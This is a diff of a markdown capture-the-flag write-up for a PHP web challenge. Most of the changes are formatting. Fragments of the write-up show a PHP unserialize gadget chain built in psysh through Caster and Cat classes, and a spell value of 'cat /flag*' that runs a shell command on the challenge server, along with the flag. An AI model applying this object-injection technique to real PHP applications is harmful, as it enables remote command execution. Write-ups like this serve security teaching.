@@ -11,12 +11,10 @@ date: 2024-01-01
 ###### tags: `NTUSTWS` `CTF` `Web`
 Challenge: http://h4ck3r.quest:8602/
 
-## Background
-None...
-
 ## Source code
 :::spoiler code
-```php=<?php
+```php
+<?php
 isset($_GET['source']) && die(!show_source(__FILE__));
 
 class Magic
@@ -36,7 +34,6 @@ class Caster
         return ($this->cast_func)($val);
     }
 }
-
 
 class Cat
 {
@@ -73,13 +70,11 @@ This is your 🐱:
 <p>/?spell=the-spell-of-your-cat</p>
 
 ```
-:::
 
 ### Description & Analyze
-
 ## Exploit - unserialize
 1. Test payload in local side
-    ```bash!
+    ```bash
     $ ./psysh
     > class Caster
     . {
@@ -100,7 +95,7 @@ This is your 🐱:
     = "/home/sbk6401"
     ```
 2. Construct serialized session
-    ```bash!
+    ```bash
     > class Cat
     . {
     .     public $magic;
@@ -131,7 +126,7 @@ This is your 🐱:
     ![](https://i.imgur.com/x5tCrhb.png)
 
 3. Get flag
-    ```bash!
+    ```bash
     > $cat->spell = "cat /flag*"
     = "cat /flag*"
 
@@ -143,5 +138,5 @@ This is your 🐱:
 Flag: `FLAG{magic_cat_pwnpwn}`
 
 ## Reference
-[PHP物件導向的第一課：class ](https://ithelp.ithome.com.tw/articles/10114633)
-[【第十九天 - PHP反序列化(1)】](https://ithelp.ithome.com.tw/articles/10277044)
+* [PHP物件導向的第一課：class ](https://ithelp.ithome.com.tw/articles/10114633)
+* [【第十九天 - PHP反序列化(1)】](https://ithelp.ithome.com.tw/articles/10277044)
